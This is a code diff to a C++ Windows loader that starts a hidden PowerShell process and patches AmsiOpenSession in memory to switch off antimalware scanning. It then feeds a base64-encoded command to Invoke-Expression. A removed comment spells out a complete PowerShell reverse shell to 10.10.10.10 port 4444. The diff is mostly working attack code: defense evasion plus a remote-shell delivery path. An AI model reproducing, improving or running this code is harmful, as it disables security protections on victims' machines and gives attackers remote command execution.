@@ -57,23 +57,39 @@ char* get_env(const char* name) {
 }
 
 
-bool patch_amsi(HANDLE hProcess) {
+bool patch_amsi(PROCESS_INFORMATION pi) {
+    HANDLE hProcess = OpenProcess(
+        PROCESS_VM_OPERATION | PROCESS_VM_WRITE, 
+        FALSE, 
+        (DWORD)pi.dwProcessId
+    );
+
+    Sleep(10000);
     HMODULE ams_dll = LoadLibraryW(L"amsi.dll");
     bool success = false;
     if (ams_dll != NULL) {
         FARPROC addr = GetProcAddress(ams_dll, "AmsiOpenSession");
         char* addr_ptr = reinterpret_cast<char*>(addr);
-        const char new_value[] = { 0x00, 0x00, 0x00, 0x00};
+        const char new_value[] = { 0x00, 0x00, 0x00, 0x00 };
         SIZE_T size = sizeof(new_value);
         SIZE_T bytes_written;
         DWORD offset = 0xC;
-        if (WriteProcessMemory(hProcess, addr_ptr + offset, new_value, size, &bytes_written) != 0) {
+        DWORD oldProtect = 0; 
+        if (WriteProcessMemory(
+            hProcess, 
+            addr_ptr + offset, 
+            new_value, 
+            size, 
+            &bytes_written) != 0) 
+        {
             success = true;
         }
-
+     
+        CloseHandle(hProcess);
         FreeLibrary(ams_dll);
     }
-
+    
+    Sleep(10000);
     return success;
 }
 
@@ -114,21 +130,20 @@ int main()
         std::cerr << "Error creating standard input pipe\n";
         return EXIT_FAILURE;
     }
-
+    
     ZeroMemory(&si, sizeof(si));
     si.cb = sizeof(si);
     si.dwFlags = STARTF_USESTDHANDLES;
     si.hStdInput = hStdinRd;
     si.hStdOutput = hStdoutWr;
     si.hStdError = hStdoutWr;
-    if (!CreateProcessAsUserW(
+    if (!CreateProcessW(
         NULL,
         wpower_path,
         NULL,
         NULL,
-        NULL,
         TRUE,
-        0,
+        CREATE_NO_WINDOW,
         NULL,
         NULL,
         psi,
@@ -137,23 +152,8 @@ int main()
     {
         return EXIT_FAILURE;
     }
-
-    Sleep(6000); 
-    HANDLE hThread = OpenThread(THREAD_SUSPEND_RESUME, FALSE, pi.dwThreadId);
-    if (hThread == NULL) {
-        CloseHandle(pi.hProcess);
-        CloseHandle(pi.hThread);
-        CloseHandle(hStdinRd);
-        CloseHandle(hStdoutRd);
-        CloseHandle(hStdinWr);
-        return EXIT_FAILURE;
-    }
-
-    SuspendThread(hThread);
-    Sleep(6000);
-    if (patch_amsi(pi.hProcess)) {
-        ResumeThread(hThread);
-         //base64 = $client = New-Object System.Net.Sockets.TCPClient('10.10.10.10', 4444); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535 | ForEach-Object {0}; while (($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {$data = ([System.Text.Encoding]::ASCII).GetString($bytes, 0, $i);$sendback = (Invoke-Expression $data 2>&1 | Out-String);$sendback2 = $sendback + 'PS ' + (Get-Location).Path + '> ';$sendbyte = ([System.Text.Encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte, 0, $sendbyte.Length);$stream.Flush()};$client.Close();
+    
+    if (patch_amsi(pi)) {
         std::string command = "Invoke-Expression -Command ([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('<base64>')))";
         WORD length = static_cast<WORD>(command.length());
         DWORD bytes_written;
